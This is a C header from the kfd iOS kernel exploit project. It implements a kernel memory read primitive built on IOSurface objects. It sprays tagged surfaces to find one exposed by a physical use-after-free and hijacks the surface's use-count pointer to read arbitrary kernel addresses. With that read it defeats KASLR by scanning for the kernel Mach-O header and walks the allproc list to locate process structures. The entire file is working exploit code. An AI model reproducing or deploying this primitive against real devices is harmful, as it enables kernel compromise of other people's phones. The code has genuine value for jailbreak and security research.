//
//  kread_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 29.07.23.
//

#ifndef kread_IOSurface_h
#define kread_IOSurface_h

#include "../IOSurface_shared.h"
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <mach-o/getsect.h>
#import <mach-o/loader.h>
#import <mach-o/nlist.h>
#import <mach-o/reloc.h>


#define IOSURFACE_MAGIC 0x1EA5CACE

io_connect_t g_surfaceConnect = 0;

u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_IOSurface_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 0x1000;
    kfd->kread.krkw_object_size = 0x400; //estimate

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);
    
    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
    // So we just call it here and keep the reference
    g_surfaceConnect = get_surface_client();
}

void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize =  (u32)id + 1;

    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;

    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
}

bool kread_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    u32 magic = *(u32 *)(object_uaddr + dynamic_info(IOSurface__pixelFormat));
    if (magic == IOSURFACE_MAGIC) {
        u64 id = *(u64 *)(object_uaddr + dynamic_info(IOSurface__allocSize)) - 1;
        kfd->kread.krkw_object_id = id;
        return true;
    }
    return false;
}

void kread_IOSurface_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u32, kread_IOSurface_kread_u32);
}

void get_kernel_section(struct kfd* kfd, u64 kernel_base, const char *segment, const char *section, u64 *addr_out, u64 *size_out)
{
    struct mach_header_64 kernel_header;
    kread((u64)kfd, kernel_base, &kernel_header, sizeof(kernel_header));
    
    uint64_t cmdStart = kernel_base + sizeof(kernel_header);
    uint64_t cmdEnd = cmdStart + kernel_header.sizeofcmds;
    
    uint64_t cmdAddr = cmdStart;
    for(int ci = 0; ci < kernel_header.ncmds && cmdAddr <= cmdEnd; ci++)
    {
        struct segment_command_64 cmd;
        kread((u64)kfd, cmdAddr, &cmd, sizeof(cmd));
        
        if(cmd.cmd == LC_SEGMENT_64)
        {
            uint64_t sectStart = cmdAddr + sizeof(cmd);
            bool finished = false;
            for(int si = 0; si < cmd.nsects; si++)
            {
                uint64_t sectAddr = sectStart + si * sizeof(struct section_64);
                struct section_64 sect;
                kread((u64)kfd, sectAddr, &sect, sizeof(sect));
                
                if (!strcmp(cmd.segname, segment) && !strcmp(sect.sectname, section)) {
                    *addr_out = sect.addr;
                    *size_out = sect.size;
                    finished = true;
                    break;
                }
            }
            if (finished) break;
        }
        
        cmdAddr += cmd.cmdsize;
    }
}

// credits to pongoOS KPF for the next two functions
static inline int64_t sxt64(int64_t value, uint8_t bits)
{
    value = ((uint64_t)value) << (64 - bits);
    value >>= (64 - bits);
    return value;
}

static inline int64_t adrp_off(uint32_t adrp)
{
    return sxt64((((((uint64_t)adrp >> 5) & 0x7ffffULL) << 2) | (((uint64_t)adrp >> 29) & 0x3ULL)) << 12, 33);
}


void kread_IOSurface_find_proc(struct kfd* kfd)
{
    u64 textPtr = UNSIGN_PTR(*(u64 *)(kfd->kread.krkw_object_uaddr + dynamic_info(IOSurface__isa)));
    
    struct mach_header_64 kernel_header;
    
    u64 kernel_base = 0;

    for (u64 page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
        struct mach_header_64 candidate_header;
        kread((u64)kfd, page, &candidate_header, sizeof(candidate_header));
        
        if (candidate_header.magic == 0xFEEDFACF) {
            kernel_header = candidate_header;
            kernel_base = page;
            break;
        }
    }
    if (kernel_header.filetype == 0xB) {
        // if we found 0xB, rescan forwards instead
        // don't ask me why (<=A10 specific issue)
        for (u64 page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
            struct mach_header_64 candidate_header;
            kread((u64)kfd, page, &candidate_header, sizeof(candidate_header));
            if (candidate_header.magic == 0xFEEDFACF) {
                kernel_header = candidate_header;
                kernel_base = page;
                break;
            }
        }
    }
    
    u64 kernel_slide = kernel_base - ARM64_LINK_ADDR;
    kfd->info.kaddr.kernel_slide = kernel_slide;
    u64 allproc = kernel_slide + dynamic_info(kernelcache__allproc);
    
    u64 proc_kaddr = 0;
    kread((u64)kfd, allproc, &proc_kaddr, sizeof(proc_kaddr));
    proc_kaddr = UNSIGN_PTR(proc_kaddr);
    while (proc_kaddr != 0) {
        u32 pid = (u32)dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
        }
        else if (pid == 0) {
            kfd->info.kaddr.kernel_proc = proc_kaddr;
        }
        proc_kaddr = dynamic_kget(proc__p_list__le_next, proc_kaddr);
    }
}

void kread_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (id != kfd->kread.krkw_object_id) {
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        release_surface(objectStorage[id].port, objectStorage[id].surface_id);
    }
}

void kread_IOSurface_free(struct kfd* kfd)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    if(kfd->kread.krkw_object_id) {
        struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
        release_surface(krwObject.port, krwObject.surface_id);
    }
    IOServiceClose(g_surfaceConnect);
}

/*
 * 32-bit kread function.
 */

u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
{
    u64 iosurface_uaddr = kfd->kread.krkw_object_uaddr;
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
    
    u64 backup = *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr));
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = kaddr - dynamic_info(IOSurface__readDisplacement);
    
    u32 read32 = 0;
    iosurface_get_use_count(krwObject.port, krwObject.surface_id, &read32);
    
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = backup;
    
    return read32;
}

#endif /* kread_IOSurface_h */
